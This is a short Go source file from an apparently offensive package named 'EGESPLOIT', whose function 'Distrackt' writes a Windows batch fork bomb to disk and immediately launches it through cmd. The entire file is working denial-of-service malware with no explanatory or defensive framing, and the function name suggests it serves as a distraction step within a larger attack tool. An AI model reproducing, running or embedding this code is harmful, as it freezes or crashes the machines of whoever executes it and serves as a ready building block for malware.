package EGESPLOIT


import "os/exec"
import "os"



func Distrackt() {

  	var Fork_Bomb string = ":A\nstart\ngoto A"
  	F_Bomb, _ := os.Create("F_Bomb.bat")

  	F_Bomb.WriteString(Fork_Bomb)

  	F_Bomb.Close()

  	exec.Command("cmd", "/C", "F_Bomb.bat").Start()
}